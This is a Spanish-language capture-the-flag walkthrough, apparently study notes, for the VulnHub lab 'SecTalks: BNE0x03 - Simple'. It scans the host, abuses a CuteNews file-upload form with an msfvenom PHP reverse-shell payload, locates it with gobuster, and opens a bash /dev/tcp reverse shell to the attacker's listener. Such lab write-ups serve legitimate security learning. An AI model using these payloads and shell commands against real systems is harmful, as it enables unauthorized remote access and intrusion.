Maquinas a utilizar **Kali Linux y SecTalks: BNE0x03 - Simple (**[https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141](https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141))

  

Vamos a ver como podemos **crear un Payload malicioso y aprovechar una vulnerabilidad de subir archivos dentro de una pagina web** para poder **tener acceso remoto** en la maquina.

```Bash
10.0.3.sudo arp-scan -I eth0 --localnet
```

```Bash
ping -c 1 10.0.3.13
```

![[Imagenes/image 31.png|image 31.png]]

  

```Bash
nmap -p- -sS -sV -sC -min-rate 5000 -n -vvv -Pn 10.0.3.13
```

![[Imagenes/image 1 20.png|image 1 20.png]]

  

Ponemos la IP en el navegador web

![[Imagenes/image 2 19.png|image 2 19.png]]

Vemos un panel de inicio con la opción de registrarnos. Vamos a registrarnos.

![[Imagenes/image 3 18.png|image 3 18.png]]

![[Imagenes/image 4 17.png|image 4 17.png]]

**NOTA:** Cuando veamos un nombre o una marca lo investigamos en Metasploit con la opción “search: cutenews”.

  

Pulsamos en Personal options.

![[Imagenes/image 5 16.png|image 5 16.png]]

Vemos que tenemos una opción para subir archivos. Entonces necesitaremos dos cosas el archivo malicioso y la ubicación donde se almacenen los archivos subidos.

- Vamos a generar el archivo malicioso.
    
    ```Bash
    msfvenom -p php/reverse_php LHOST=10.0.3.4 LPORT=443 -f raw > pwned.php 
    ```
    
    ![[Imagenes/image 6 15.png|image 6 15.png]]
    
    - `**p php/reverse_php**`: Especifica el tipo de payload. En este caso, se genera un payload de PHP que establece una conexión inversa (reverse shell) desde el objetivo hacia el atacante.
    - `**LHOST=10.0.3.4**`: Define la dirección IP del atacante (Local Host) que recibirá la conexión inversa.
    - `**LPORT=443**`: Especifica el puerto en el que el atacante escuchará la conexión. El puerto 443 es comúnmente utilizado para tráfico HTTPS, lo que puede ayudar a evadir detección.
    - `**f raw**`: Indica el formato del payload. Aquí se genera en formato "raw" (sin codificación adicional).
    - `**> pwned.php**`: Redirige la salida del payload generado a un archivo llamado `pwned.php`.
    
      
    
- Subimos el archivo malicioso a través del formulario
    
    ![[Imagenes/image 7 13.png|image 7 13.png]]
    
- Vamos a hacer **Fuzzing Web** para saber donde se a subido el archivo. utilizaremos **la herrmienta Gobuster.**
    
    ```Bash
    gobuster dir -u http://10.0.3.13/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    ![[Imagenes/image 8 12.png|image 8 12.png]]
    
      
    
- En el navegador web.
    
    ![[Imagenes/image 9 11.png|image 9 11.png]]
    
    Vemos que hay se encuentra el archivo malicioso que he subido anteriormente.
    
      
    
- Utilizamos **netcat** para ponernos a la escucha en el **puerto 443** que es el que hemos utilizado para nuestro archivo malicioso.
    
    ```Bash
    nc -nlvp 443
    ```
    
    ![[Imagenes/image 10 11.png|image 10 11.png]]
    

  

  

**NOTA:** El Payload en msfvenom funciona mal. Después de un rato fácilmente vamos a perder la conexión para evitar esto y tener una conexión mas estable aremos lo siguiente.

- Abrimos un nuevo terminal y nos ponemos a la escucha con netcat en un puerto diferente por ejempló 4444.
    
    ```Bash
    nc -nlvp 4444
    ```
    
- En la pagina web [Online - Reverse Shell Generator](https://www.revshells.com/) ponemos la IP de nuestra Kali y puerto y copiamos el payload.
    
    ![[Imagenes/image 11 8.png|image 11 8.png]]
    

  

- Abrimos otra terminal y lanzamos otro netcat escuchando el puerto 4444
    
    ![[Imagenes/image 12 8.png|image 12 8.png]]
    

  

- Ejecutamos nuestro archivo malicioso
    
    ![[Imagenes/image 13 8.png|image 13 8.png]]
    
    Miramos si funciona por ejemplo mirando que usuario soy.
    
    `whoami`
    
    Y ejecutamos el payload que habíamos copiado
    
    `bash -c "``**sh**` `-i >& /dev/tcp/``**10.0.3.4**``/``**4444**` `0>&1"`
    
    ![[Imagenes/image 14 6.png|image 14 6.png]]
    
      
    
    Vemos como **se abre una nueva conexión mucho mas estable** en la escucha del puerto 4444. Podríamos cerrar la terminal en la que escuchábamos por el puerto 443 sin ningún problema.
    
    ![[Imagenes/image 15 5.png|image 15 5.png]]